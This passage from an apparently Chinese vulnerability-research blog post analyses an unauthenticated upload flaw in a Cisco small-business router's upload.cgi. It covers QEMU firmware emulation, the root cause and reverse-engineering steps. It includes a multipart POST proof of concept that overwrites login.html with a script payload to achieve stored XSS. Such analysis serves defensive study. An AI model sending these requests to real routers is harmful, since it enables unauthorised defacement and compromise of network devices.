<p>所以这里再执行 <code>/etc/init.d/boot boot</code> ，此刻如果你开启 <code>nginx</code> 服务的话（端口如果被占用了，执行 <code>/etc/init.d/nginx restart</code> 进行重启）应该就发现访问到路由器的首页面了，如下</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307312004418.png" alt="image-20230731200447091"></p>
<p>因此最终启动服务的命令如下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/etc/init.d/boot boot</span><br><span class="line">generate_default_cert</span><br><span class="line">/etc/init.d/confd start</span><br><span class="line">/etc/init.d/nginx start</span><br></pre></td></tr></table></figure>

<p>如果刚开始测试的时候把环境整的乱七八糟，发现上面启动了 <code>nginx</code> 服务，访问是失败的。不用慌，接下来先确保完成下面的四个操作</p>
<ol>
<li>关掉 <code>qemu</code> ，重新进入，依次执行上面的四个命令，并确保命令是执行成功了（因为是仿真，虽然还有很多报错，但只要能启动需要的服务就是好仿真）</li>
<li>确保 <code>binwalk</code> 解压的文件系统完整，并且软链接还在（尽可能不要解固件的时候出现 <code>warning</code> ）</li>
<li>是否用 <code>scp</code> 传进来的是压缩过的文件系统，而不是直接传了文件系统</li>
<li>虚拟机中能否访问成功路由器的登录界面（不是主机）</li>
</ol>
<p>如果这四个操作全部做过，但依然访问失败的话，那么你可以开始慌了。因为上面的四种情况导致了主机中不能成功访问路由器登录界面的情况我都遇见过。如果还是不行的话，那确实是我没遇见的情况。下面我给出我执行四条命令后的输出错误信息（此时可以访问成功登录界面），如果还是无法成功访问路由器登录界面的话，可以比对下面的错误信息，看看哪里不同，去找到相应的解决方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/ # /etc/init.d/boot boot</span><br><span class="line">mount: mounting debugfs on /sys/kernel/debug failed: No such file or directory</span><br><span class="line">Mounting mnt partitions..mount: mounting /dev/mtdblock9 on /mnt/configcert failed: No such device</span><br><span class="line">mount: mounting /dev/mtdblock10 on /mnt/avcsign failed: No such device</span><br><span class="line">mount: mounting /dev/mtdblock11 on /mnt/webrootdb failed: No such device</span><br><span class="line">mount: mounting /dev/mtdblock12 on /mnt/license failed: No such device</span><br><span class="line">done.</span><br><span class="line"> create_meta_data_xml begin</span><br><span class="line"> meta_data_gen_state: 0</span><br><span class="line"> meta_data_gen_state: 1</span><br><span class="line"> create_meta_data_xml end</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">/ # generate_default_cert </span><br><span class="line">touch: /tmp/stats/certstats.tmp: No such file or directory</span><br><span class="line">/usr/bin/certscript: line 1: can&#x27;t create /tmp/stats/certstats.tmp: nonexistent directory</span><br><span class="line">perl: warning: Setting locale failed.</span><br><span class="line">perl: warning: Please check that your locale settings:</span><br><span class="line">	LANGUAGE = (unset),</span><br><span class="line">	LC_ALL = (unset),</span><br><span class="line">	LANG = &quot;en_US.UTF-8&quot;</span><br><span class="line">    are supported and installed on your system.</span><br><span class="line">perl: warning: Falling back to the standard locale (&quot;C&quot;).</span><br><span class="line">cp: can&#x27;t stat &#x27;/tmp/stats/certstats.tmp&#x27;: No such file or directory</span><br><span class="line">Default</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/ # /etc/init.d/confd start</span><br><span class="line">TRACE Connected (maapi) to ConfD</span><br><span class="line">attaching to init session...</span><br><span class="line">TRACE MAAPI_ATTACH  --&gt; CONFD_OK</span><br><span class="line">TRACE MAAPI_DELETE /avc-meta-data --&gt; CONFD_OK</span><br><span class="line">TRACE MAAPI_LOAD_CONFIG_FILE  --&gt; CONFD_OK</span><br><span class="line">TRACE Connected (maapi) to ConfD</span><br><span class="line">attaching to init session...</span><br><span class="line">TRACE MAAPI_ATTACH  --&gt; CONFD_OK</span><br><span class="line">TRACE MAAPI_DELETE /device-os-types --&gt; CONFD_OK</span><br><span class="line">TRACE MAAPI_LOAD_CONFIG_FILE  --&gt; CONFD_OK</span><br><span class="line">TRACE Connected (maapi) to ConfD</span><br><span class="line">attaching to init session...</span><br><span class="line">TRACE MAAPI_ATTACH  --&gt; CONFD_OK</span><br><span class="line">TRACE MAAPI_DELETE /webfilter-meta-data --&gt; CONFD_OK</span><br><span class="line">TRACE MAAPI_LOAD_CONFIG_FILE  --&gt; CONFD_OK</span><br><span class="line">0</span><br><span class="line">uci: Entry not found</span><br><span class="line">0</span><br><span class="line">uci: Entry not found</span><br><span class="line">uci: Entry not found</span><br><span class="line">uci: Entry not found</span><br><span class="line"></span><br><span class="line">uci: Parse error (option/list command found before the first section) at line 2492, byte 1</span><br><span class="line">cp: can&#x27;t stat &#x27;/tmp/etc/syslog_config_template&#x27;: No such file or directory</span><br><span class="line">sed: /tmp/syslog-ng.conf: No such file or directory</span><br><span class="line">Error opening configuration file; filename=&#x27;/tmp/syslog-ng.conf&#x27;, error=&#x27;Success (0)&#x27;</span><br><span class="line">SIOCGMIIPHY: No such device</span><br><span class="line">Failed to connect to ubus</span><br><span class="line">Failed to parse json data: unexpected end of data</span><br><span class="line">Failed to connect to ubus</span><br><span class="line">Failed to parse json data: unexpected end of data</span><br><span class="line">Failed to connect to ubus</span><br><span class="line">Failed to parse json data: unexpected end of data</span><br><span class="line">Failed to connect to ubus</span><br><span class="line">Failed to parse json data: unexpected end of data</span><br><span class="line">Failed to connect to ubus</span><br><span class="line">Failed to parse json data: unexpected end of data</span><br><span class="line">Failed to connect to ubus</span><br><span class="line">Failed to parse json data: unexpected end of data</span><br><span class="line">Failed to connect to ubus</span><br><span class="line">Failed to parse json data: unexpected end of data</span><br><span class="line">Failed to connect to ubus</span><br><span class="line">Failed to parse json data: unexpected end of data</span><br><span class="line">Failed to connect to ubus</span><br><span class="line">Failed to parse json data: unexpected end of data</span><br><span class="line">Failed to connect to ubus</span><br><span class="line">Failed to parse json data: unexpected end of data</span><br><span class="line">Failed to connect to ubus</span><br><span class="line">0</span><br><span class="line">PnP Agent is starting!</span><br><span class="line"></span><br><span class="line">/ # /etc/init.d/nginx start</span><br><span class="line">chown: /var/firmware: No such file or directory</span><br><span class="line">chown: /var/3g-4g-driver: No such file or directory</span><br><span class="line">chown: /var/in_certs: No such file or directory</span><br><span class="line">chown: /var/signature: No such file or directory</span><br><span class="line">chown: /var/language-pack: No such file or directory</span><br><span class="line">chown: /var/configuration: No such file or directory</span><br><span class="line">FAILED: maapi_get_elem(ms, mtid, &amp;val, argv[0]), Error: item does not exist (1): /firewall-basic-settings:firewall/remote-web-management/cert does not exist, in function do_maapi_get, line 1463</span><br><span class="line">touch: /tmp/stats/certstats.tmp: No such file or directory</span><br><span class="line">perl: warning: Setting locale failed.</span><br><span class="line">perl: warning: Please check that your locale settings:</span><br><span class="line">	LANGUAGE = (unset),</span><br><span class="line">	LC_ALL = (unset),</span><br><span class="line">	LANG = &quot;en_US.UTF-8&quot;</span><br><span class="line">    are supported and installed on your system.</span><br><span class="line">perl: warning: Falling back to the standard locale (&quot;C&quot;).</span><br><span class="line">cp: can&#x27;t stat &#x27;/tmp/stats/certstats.tmp&#x27;: No such file or directory</span><br><span class="line">FAILED: maapi_get_elem(ms, mtid, &amp;val, argv[0]), Error: item does not exist (1): /ciscosb-restconf:ciscosb-restconf/transport/https/cert does not exist, in function do_maapi_get, line 1463</span><br><span class="line">touch: /tmp/stats/certstats.tmp: No such file or directory</span><br><span class="line">perl: warning: Setting locale failed.</span><br><span class="line">perl: warning: Please check that your locale settings:</span><br><span class="line">	LANGUAGE = (unset),</span><br><span class="line">	LC_ALL = (unset),</span><br><span class="line">	LANG = &quot;en_US.UTF-8&quot;</span><br><span class="line">    are supported and installed on your system.</span><br><span class="line">perl: warning: Falling back to the standard locale (&quot;C&quot;).</span><br><span class="line">cp: can&#x27;t stat &#x27;/tmp/stats/certstats.tmp&#x27;: No such file or directory</span><br><span class="line">FAILED: maapi_get_elem(ms, mtid, &amp;val, argv[0]), Error: item does not exist (1): /ciscosb-netconf:ciscosb-netconf/transport/ssh/cert does not exist, in function do_maapi_get, line 1463</span><br><span class="line">touch: /tmp/stats/certstats.tmp: No such file or directory</span><br><span class="line">perl: warning: Setting locale failed.</span><br><span class="line">perl: warning: Please check that your locale settings:</span><br><span class="line">	LANGUAGE = (unset),</span><br><span class="line">	LC_ALL = (unset),</span><br><span class="line">	LANG = &quot;en_US.UTF-8&quot;</span><br><span class="line">    are supported and installed on your system.</span><br><span class="line">perl: warning: Falling back to the standard locale (&quot;C&quot;).</span><br><span class="line">cp: can&#x27;t stat &#x27;/tmp/stats/certstats.tmp&#x27;: No such file or directory</span><br><span class="line">/ # [uWSGI] getting INI configuration from /etc/uwsgi/upload.ini</span><br><span class="line">[uWSGI] getting INI configuration from /etc/uwsgi/blockpage.ini</span><br><span class="line">[uWSGI] getting INI configuration from /etc/uwsgi/jsonrpc.ini</span><br><span class="line">*** Starting uWSGI 2.0.15 (32bit) on [Mon Jul 31 11:52:02 2023] ***</span><br><span class="line">compiled with version: 4.8.3 on 17 October 2022 13:32:49</span><br><span class="line">os: Linux-3.2.0-4-vexpress #1 SMP Debian 3.2.51-1</span><br><span class="line">nodename: Router</span><br><span class="line">machine: armv7l</span><br><span class="line">clock source: unix</span><br><span class="line">pcre jit disabled</span><br><span class="line">detected number of CPU cores: 4</span><br><span class="line">current working directory: /</span><br><span class="line">detected binary path: /usr/sbin/uwsgi</span><br><span class="line">setgid() to 33</span><br><span class="line">*** Starting uWSGI 2.0.15 (32bit) on [Mon Jul 31 11:52:02 2023] ***</span><br><span class="line">compiled with version: 4.8.3 on 17 October 2022 13:32:49</span><br><span class="line">os: Linux-3.2.0-4-vexpress #1 SMP Debian 3.2.51-1</span><br><span class="line">nodename: Router</span><br><span class="line">machine: armv7l</span><br><span class="line">clock source: unix</span><br><span class="line">pcre jit disabled</span><br><span class="line">detected number of CPU cores: 4</span><br><span class="line">current working directory: /</span><br><span class="line">detected binary path: /usr/sbin/uwsgi</span><br><span class="line">setgid() to 33</span><br><span class="line">setuid() to 33</span><br><span class="line">setuid() to 33</span><br><span class="line">your processes number limit is 961</span><br><span class="line">your processes number limit is 961</span><br><span class="line">your memory page size is 4096 bytes</span><br><span class="line">your memory page size is 4096 bytes</span><br><span class="line">detected max file descriptor number: 1024</span><br><span class="line">detected max file descriptor number: 1024</span><br><span class="line">lock engine: pthread robust mutexes</span><br><span class="line">lock engine: pthread robust mutexes</span><br><span class="line">thunder lock: disabled (you can enable it with --thunder-lock)</span><br><span class="line">uwsgi socket 0 bound to TCP address 127.0.0.1:9003 fd 3</span><br><span class="line">*** Starting uWSGI 2.0.15 (32bit) on [Mon Jul 31 11:52:02 2023] ***</span><br><span class="line">compiled with version: 4.8.3 on 17 October 2022 13:32:49</span><br><span class="line">os: Linux-3.2.0-4-vexpress #1 SMP Debian 3.2.51-1</span><br><span class="line">nodename: Router</span><br><span class="line">machine: armv7l</span><br><span class="line">clock source: unix</span><br><span class="line">pcre jit disabled</span><br><span class="line">detected number of CPU cores: 4</span><br><span class="line">current working directory: /</span><br><span class="line">detected binary path: /usr/sbin/uwsgi</span><br><span class="line">your server socket listen backlog is limited to 100 connections</span><br><span class="line">your mercy for graceful operations on workers is 60 seconds</span><br><span class="line">thunder lock: disabled (you can enable it with --thunder-lock)</span><br><span class="line">uwsgi socket 0 bound to TCP address 127.0.0.1:9000 fd 3</span><br><span class="line">your server socket listen backlog is limited to 100 connections</span><br><span class="line">your mercy for graceful operations on workers is 60 seconds</span><br><span class="line">mapped 128512 bytes (125 KB) for 1 cores</span><br><span class="line">*** Operational MODE: single process ***</span><br><span class="line">initialized CGI path: /www/cgi-bin/upload.cgi</span><br><span class="line">*** no app loaded. going in full dynamic mode ***</span><br><span class="line">*** uWSGI is running in multiple interpreter mode ***</span><br><span class="line">spawned uWSGI master process (pid: 4377)</span><br><span class="line">spawned uWSGI worker 1 (pid: 4380, cores: 1)</span><br><span class="line">setgid() to 33</span><br><span class="line">mapped 321280 bytes (313 KB) for 4 cores</span><br><span class="line">setuid() to 33</span><br><span class="line">your processes number limit is 961</span><br><span class="line">your memory page size is 4096 bytes</span><br><span class="line">detected max file descriptor number: 1024</span><br><span class="line">lock engine: pthread robust mutexes</span><br><span class="line">thunder lock: disabled (you can enable it with --thunder-lock)</span><br><span class="line">*** Operational MODE: preforking ***</span><br><span class="line">initialized CGI mountpoint: /jsonrpc = /www/cgi-bin/jsonrpc.cgi</span><br><span class="line">*** no app loaded. going in full dynamic mode ***</span><br><span class="line">*** uWSGI is running in multiple interpreter mode ***</span><br><span class="line">spawned uWSGI master process (pid: 4375)</span><br><span class="line">spawned uWSGI worker 1 (pid: 4385, cores: 1)</span><br><span class="line">uwsgi socket 0 bound to TCP address 127.0.0.1:9001 fd 3</span><br><span class="line">your server socket listen backlog is limited to 100 connections</span><br><span class="line">your mercy for graceful operations on workers is 60 seconds</span><br><span class="line">spawned uWSGI worker 2 (pid: 4386, cores: 1)</span><br><span class="line">mapped 128512 bytes (125 KB) for 1 cores</span><br><span class="line">*** Operational MODE: single process ***</span><br><span class="line">initialized CGI mountpoint: /blocked.php = /www/cgi-bin/blockpage.cgi</span><br><span class="line">*** no app loaded. going in full dynamic mode ***</span><br><span class="line">*** uWSGI is running in multiple interpreter mode ***</span><br><span class="line">spawned uWSGI master process (pid: 4376)</span><br><span class="line">spawned uWSGI worker 3 (pid: 4387, cores: 1)</span><br><span class="line">spawned uWSGI worker 4 (pid: 4389, cores: 1)</span><br><span class="line">spawned uWSGI worker 1 (pid: 4388, cores: 1)</span><br></pre></td></tr></table></figure>



<h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>关于这个洞的成因，我也跟 <strong>winmt</strong> 师傅聊了一下，这里我说一下我认为导致这个漏洞能利用的三个点。</p>
<h3 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h3><p>这里存在未授权的文件上传（如下），仅仅看这里也没啥用，因为文件上传到了 <code>/tmp/upload</code> 目录下，第二就是如果没有绕过那个正则检查的话，也会将上传的文件夹全删掉。所以这里仅是个前提条件</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308011952910.png" style="zoom: 33%;" />

<h3 id="根本原因"><a href="#根本原因" class="headerlink" title="根本原因"></a>根本原因</h3><p>根本原因是身份认证位于了漏洞发生处之后，只要 <code>system</code> 的命令执行成功，<code>sub_115EC</code> 函数的返回值就为 <code>0</code> ，又因为我们访问的 <code>URL</code> 为 <code>/api/operations/ciscosb-file:form-file-upload</code> ，所以会进入下面的 <code>if</code> 执行 <code>sub_125A8</code> 函数（如下图）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308012022558.png" alt="image-20230801202228360"></p>
<p>而 <code>sub_125A8</code> 函数中的如下位置会做身份认证，但是出现的问题就在于身份认证在漏洞触发点之后，所以做了跟没做一样，还是可以未授权文件上传。<strong>winmt</strong> 师傅说可能之前那是前置操作部分，开发者想把身份认证的位置放到前置操作之后，但是没想到前置操作部分就存在了一个漏洞点</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308012030831.png" alt="image-20230801203018066"></p>
<h3 id="临门一脚"><a href="#临门一脚" class="headerlink" title="临门一脚"></a>临门一脚</h3><p>就算上面两个条件都满足了，也只是可以将上传的文件移动到 <code>/tmp/www</code> 目录下，如果这下面没放什么东西的话，也不会有什么危害。但问题就在于 <code>/www/login.html</code> 和 <code>index.html</code>  两个文件软链接到了 <code>/tmp/www/login.html</code> 和 <code>/tmp/www/index.html</code> 上（如下图），只要覆盖掉 <code>/tmp/www/login.html</code> 或者 <code>/tmp/www/index.html</code> 就可以篡改掉登录首页面，从而完成了最终存储型 <code>XSS</code> 攻击</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308012240680.png" alt="image-20230801224055546"></p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="配置文件分析"><a href="#配置文件分析" class="headerlink" title="配置文件分析"></a>配置文件分析</h3><p>第一个红框是该文件路径，第二个红框中的代码展示的是 <code>Nginx</code> 文件上传模块，下面对代码逐一分析</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307312029702.png" alt="image-20230731202928569" style="zoom:67%;" />

<p>首先是 <code>location /api/operations/ciscosb-file:form-file-upload</code> ，这个 <code>location</code> 块是 <code>Nginx</code> 配置文件中用于匹配 <code>URL</code> 路径的指令，就比如访问 <code>192.168.0.1：/api/operations/ciscosb-file:form-file-upload</code> 就可以执行到下面的代码。</p>
<p>然后代码 <code>14</code> 到 <code>22</code> 行是很好理解的， <code>$http_authorization</code> 为空的话返回 <code>403</code> ，非空的话就可以执行下面的代码。这里的 <code>$http_authorization</code> 是 <code>HTTP</code> 请求中 <code>Authorization</code> 的值，从如下代码可以判断出来</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307312039015.png" alt="image-20230731203908789" style="zoom:67%;" />



<p><code>upload_pass /form-file-upload</code> 转至后台处理 <code>/form-file-upload</code> 这个 <code>URL</code></p>
<p><code>upload_store /tmp/upload</code> 上传文件临时保存路径为 <code>/tmp/upload</code></p>
<p><code>upload_store_access user:rw group:rw all:rw</code> 表示上传文件的权限</p>
<p><code>upload_set_form_field</code> 设置额外的表单字段，一些变量如下。这块在最后编写 <code>EXP</code> 的时候有一个很重要的点，后面再说。	</p>
<p><code>$upload_file_name</code> 文件原始名字<br><code>$upload_field_name</code> 表单的 <code>name</code> 值<br><code>$upload_content_type</code> 文件的类型<br><code>$upload_tmp_path</code> 文件上传后的地址</p>
<p><code>upload_aggregate_form_field</code> 额外的变量，在上传成功后生成这几个字段</p>
<p><code>$upload_file_md5</code> 文件的 <code>MD5</code> 校验值<br><code>$upload_file_size</code> 文件大小</p>
<p><code>upload_cleanup 400 404 499 500-505</code> 如果 <code>pass</code> 页面是以下状态码，就删除本次上传的文件</p>
<p>这地方的代码就很奇怪，因为这里只需要控制一下 <code>Authorization</code> 就可以将文件上传到 <code>/tmp/upload</code> 目录，也没有做 <code>sessionid</code> 的判断。可以看一下 <code>location /upload</code> 的代码（如下图），这里做了 <code>/tmp/websession/token/$cookie_sessionid</code> 文件是否存在的判断以及正则匹配的检查防止目录穿越</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307312140872.png" alt="image-20230731214036747"></p>
<p>说完此处的文件上传，再来看一下 <code>upload_pass /form-file-upload</code>，它会跳转到 <code>location /form-file-upload</code> 这里的代码来执行，这里有一个 <code>uwsgi_pass 127.0.0.1:9003</code> ，它会把请求转发给 <code>uwsgi</code> 给处理。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307312144943.png" alt="image-20230731214411886"></p>
<p>顺便提一下，在 <code>Nginx</code> 的启动脚本中最后一句是 <code>$UWSGI start</code> ，启动的就是这个 <code>uwsgi</code> 服务，它启动后会开启下面三个进程（如下图）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307312148386.png" alt="image-20230731214830312"></p>
<p> <code>uwsgi -m --ini /etc/uwsgi/upload.ini &amp;</code> 在这个进程中会调用 <code>upload.cgi</code> 进程（为什么是 <code>upload.cgi</code> 进程呢？因为在配置中记录了要执行的程序路径，如下），调用的方式是先 <code>fork</code> 了一个子进程，然后 <code>execvp</code> 来执行 <code>upload.cgi</code></p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307312152741.png" alt="image-20230731215206683" style="zoom:50%;" />



<h3 id="二进制程序upload-cgi分析"><a href="#二进制程序upload-cgi分析" class="headerlink" title="二进制程序upload.cgi分析"></a>二进制程序upload.cgi分析</h3><h4 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h4><p>接着来分析漏洞的触发点，它就位于这个 <code>/www/cgi-bin/upload.cgi</code> 二进制程序中。</p>
<p>因为程序去除了符号表，所以我们从 <code>_libc_start_main</code> 中寻找 <code>main</code> 函数入口（该函数的第一个参数就是 <code>main</code> 函数）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308010933346.png" alt="image-20230801093346122"></p>
<p>接下来从最终的利用点进行倒着分析，这个 <code>sub_115EC</code> 函数被调用于 <code>main</code> 函数。</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308010956881.png" alt="image-20230801095627793" style="zoom:67%;" />

<p>最终 <code>system</code> 会执行 <code>mv -f a2 v8/a3</code> ，而这三个变量都可以控制，<code>/www/login.html</code> 软链接到了 <code>/tmp/www/login.html</code> 这个文件上，因此如果我们能把 <code>a2</code> 控制为刚上传的文件路径，<code>v8</code> 控制为 <code>/tmp/www</code> ，<code>a3</code> 控制为 <code>login.html</code> 就能执行 <code>mv -f /tmp/upload/xxx /www/login.html</code> 从而完成对路由器登录界面的篡改。要将 <code>v8</code> 控制为 <code>/tmp/www</code> 则要设置 <code>a1</code> 的值为 <code>Portal</code> </p>
<h4 id="参数控制"><a href="#参数控制" class="headerlink" title="参数控制"></a>参数控制</h4><p>上面对 <code>sub_115EC</code> 函数的三个实参进行了分析，下面看一下 <code> main</code> 函数中这三个参数是怎么控制的</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308011038849.png" alt="image-20230801103832666"></p>
<p>溯源这些值的话，<code>v17</code> 是 <code>pathparam</code> 字段的值（根据上面的分析，将这个字段要控制为 <code>Portal</code>）， <code>v16</code> 是 <code>file.path</code> 字段的值（这里要为刚上传的文件路径），<code>v18</code> 是 <code>fileparam</code> 的值（这里要控制为 <code>login.html</code>）</p>
<h4 id="动态调试解析报文字段"><a href="#动态调试解析报文字段" class="headerlink" title="动态调试解析报文字段"></a>动态调试解析报文字段</h4><p>问题是这些要控制的值怎么来呢？</p>
<p>这需要分析下面的代码（此处的分析需要配合动态调试，关于如何动态调试这种 <code>cgi</code> 程序，请跳转到 <a href="#%E8%B0%83%E8%AF%95%E6%96%B9%E6%B3%95">此处</a>）</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308011047636.png" alt="image-20230801104719584" style="zoom:67%;" />

<p>因为程序中读入数据的只有 <code>fread</code> ，所以假定这里是读入 <code>POST</code> 请求,接着先来写一个报文发过去调试一下，这里要控制 <code>pathparam</code> 和 <code>fileparam</code> 为上面我们指定的值，至于那个 <code>file.path</code> 是什么还不知道，这里都一起发过去试试。（由上图中通过定位<code>boundary=</code>字符串获取报文分隔符，结合该<code>cgi</code>的具体功能文件上传，可知该报文需要以表单格式 <code>multipart/form-data</code>发送 <code>POST</code> 请求）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">------------</span><br><span class="line">Content-Disposition: form-data; name=&quot;pathparam&quot;</span><br><span class="line"></span><br><span class="line">Portal</span><br><span class="line">------------</span><br><span class="line">Content-Disposition: form-data; name=&quot;fileparam&quot;</span><br><span class="line"></span><br><span class="line">login.html</span><br><span class="line">------------</span><br><span class="line">Content-Disposition: form-data; name=&quot;file.path&quot;</span><br><span class="line"></span><br><span class="line">login.html</span><br><span class="line">------------</span><br><span class="line">Content-Disposition: form-data; name=&quot;what&quot;;filename=&quot;login.html&quot;;Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;title&gt;test&lt;/title&gt;</span><br><span class="line">&lt;script&gt;alert(&#x27;debug&#x27;)&lt;/script&gt;</span><br><span class="line">------------	</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308012311784.png" alt="image-20230801231158599"></p>
<p>我选择把断点打在了 <code>0x10EBC</code> 处，这里是刚刚执行完了 <code>fread</code> 函数。通过查看代码得知，<code>fread</code> 函数执行完会在读入的数据末尾加一个 <code>0</code> ，下图红框中的指令就是在做这件事，分析得知 <code>R5</code> 寄存器是存放着刚读入的数据，下面来查看一下</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308011335171.png" alt="image-20230801133541574"></p>
<p>如此验证了猜测，这里确实是 <code>POST</code> 报文，接下来看一下后面是怎么把报文中的字段值解析出来的（补充一点，不知道为什么调试的时候是没办法用 <code>n</code> 来跳过函数的，我用的方法是打断点 <code>c</code> 过去）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308011337661.png" alt="image-20230801133756369"></p>
<p>下面我直接说解析字段的结论，如果有想弄清过程的师傅可以自己调试一下。这个 <code>multipart_parser_execute</code> 函数是将 <code>POST</code> 报文进行了字段的解析，就大概是做了一个键值对出来，可能用结构体来实现的（反正调试看到的是用多个堆块通过指针的方式，将键和值做一个匹配）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308011348339.png" alt="image-20230801134843284"></p>
<p>然后执行到 <code>jsonutil_get_string</code> 函数时，可以把 <code>file.path</code> <code>pathparam</code> 这种字段的值给解析出来，以 <code>jsonutil_get_string(dword_2348C, &amp;v26, &quot;\&quot;file.path\&quot;&quot;, -1);</code> 为例，下面放出该函数执行前和执行后的情况</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308011358878.png" alt="image-20230801135829658" style="zoom: 80%;" />



<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308011359615.png" alt="image-20230801135913097" style="zoom:67%;" />

<p>这里可以看到确实是把 <code>file.path</code> 解析出来了，值为 <code>login.html</code> 这是因为当时发送的报文就是这么设置的（如下）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;file.path&quot;</span><br><span class="line"></span><br><span class="line">login.html</span><br></pre></td></tr></table></figure>

<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="执行流走偏"><a href="#执行流走偏" class="headerlink" title="执行流走偏"></a>执行流走偏</h3><p>其他几个字段的解析是同理的，然后我们继续调试，结果发现会进入这个 <code>if</code> 中（如下图）最后直接返回，并没有触发到有漏洞的 <code>sub_115EC</code> 函数</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308011415992.png" alt="image-20230801141537947"></p>
<p>需要注意，这里的 <code>IDA</code> 显示错误了（如上图），很明显这里是在进行正则匹配，但只有规则，没有要匹配的字符串，不过 <code>GDB</code> 依然给力，可以正常显示（如下图）</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308011417396.png" alt="image-20230801141716116" style="zoom:67%;" />

<p>这个函数在对 <code>login.html</code> 字符串进行匹配，但在发送的报文中我们将 <code>file.path</code> 和 <code>fileparam</code> 都设置为了 <code>login.html</code> ，是匹配的哪个字段的值呢？我们通过 <code>IDA</code> 的汇编部分来寻找一下，通过下图可以看出来， <code>R1</code> 的值是从 <code>SP,#0x478+var_460</code> 位置拿到的，其实也就是 <code>SP+0x18</code> 的位置</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308011420304.png" alt="image-20230801142014216"></p>
<p>然后我们往上寻找，发现在解析 <code>file.path</code> 字段时，出现了这个地址。因此得出结论是 <code>match_regex</code> 会对 <code>file.path</code> 的值进行正则匹配，函数返回值为 <code>1</code> ，于是执行流就走偏了（做一些退出的工作，就结束了，在结束前会调用 <code>system</code> 函数将 <code>/tmp/upload</code> 下的所有文件删掉）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308011421560.png" alt="image-20230801142143468"></p>
<h3 id="控制file-path字段-方法一"><a href="#控制file-path字段-方法一" class="headerlink" title="控制file.path字段-方法一"></a>控制file.path字段-方法一</h3><p>要想成功的话，就得让 <code>file.path</code> 为 <code>/tmp/upload/xxx</code> ，正常的序号应该是下面这样，<code>/tmp/upload/0000000001</code> ，只需要把 <code>upload.cgi</code> 进程卡住，查看一下 <code>/tmp/upload</code> 目录下的文件即可（如下）</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308011443511.png" alt="image-20230801144341178" style="zoom:67%;" />



<p>现在尝试一下，我们设置 <code>file.path</code> 字段的值为 <code>/tmp/upload/0000000001</code> 再发一次报文，看看能否通过正则检查，发现函数执行后的返回值为 <code>0</code>，如此通过了检查（如下图）</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308011446052.png" alt="image-20230801144610759" style="zoom: 67%;" />

<p>刚刚发送的报文如下</p>
<h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">------------</span><br><span class="line">Content-Disposition: form-data; name=&quot;pathparam&quot;</span><br><span class="line"></span><br><span class="line">Portal</span><br><span class="line">------------</span><br><span class="line">Content-Disposition: form-data; name=&quot;fileparam&quot;</span><br><span class="line"></span><br><span class="line">login.html</span><br><span class="line">------------</span><br><span class="line">Content-Disposition: form-data; name=&quot;file.path&quot;</span><br><span class="line"></span><br><span class="line">/tmp/upload/0000000001</span><br><span class="line">------------</span><br><span class="line">Content-Disposition: form-data; name=&quot;what&quot;;filename=&quot;login.html&quot;;Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;title&gt;test&lt;/title&gt;</span><br><span class="line">&lt;script&gt;alert(&#x27;debug&#x27;)&lt;/script&gt;</span><br><span class="line">------------	</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308011447139.png" alt="image-20230801144712953"></p>
<p>继续调试，发现可以成功走到 <code>system</code> 函数，并执行 <code>mv</code> 命令（如下）</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308011459704.png" alt="image-20230801145913390" style="zoom:67%;" />

